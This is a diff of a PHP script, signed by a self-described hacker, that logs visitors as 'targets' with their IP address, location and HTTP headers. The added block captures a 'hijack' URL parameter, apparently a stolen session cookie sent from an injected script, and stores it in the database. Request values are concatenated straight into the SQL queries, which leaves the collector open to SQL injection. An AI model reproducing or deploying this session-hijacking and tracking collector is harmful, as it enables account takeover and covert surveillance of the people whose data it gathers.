@@ -4,7 +4,6 @@
 *   If you're reading this if this helped you don't ignore that message
 * Help me with some hacking Tips/Tricks or resources to gain my knowledge
 *         My facebook : https://www.facebook.com/000xPlan
-*            My twitter : https://twitter.com/CXXMIXCSII
 *              My Github : https://github.com/CXVVMVII
 *                    Made By @WhizzHandrixx
 */
@@ -108,9 +107,20 @@ $today = date("Y/m/d") ." at " . date("h:i:sa");
 * INSERT DEATAILS TO DB
 */
 
+if(isset($_GET['hijack'])) {
+   
+   $value = $_GET['hijack'];
+   $heads = $headers."\n\n\r-------\n\n\r"."hijack=".$value;
+   
+   $insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."',  '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$heads."')";
+   $mysq = mysqli_query($db_con ,$insert);
 
-$insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."', '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$headers."')";
-$mysq = mysqli_query($db_con ,$insert);
+} else {
+    $insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."',  '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$headers."')";
+   $mysq = mysqli_query($db_con ,$insert);
+
+}
+
 
 ?>
 
@@ -119,10 +129,11 @@ $mysq = mysqli_query($db_con ,$insert);
 *   If you're reading this if this helped you don't ignore that message
 * Help me with some hacking Tips/Tricks or resources to gain my knowledge
 *         My facebook : https://www.facebook.com/000xPlan
-*            My twitter : https://twitter.com/CXXMIXCSII
 *              My Github : https://github.com/CXVVMVII
 *                    Made By @WhizzHandrixx
 */
 -->
+
+
 
 
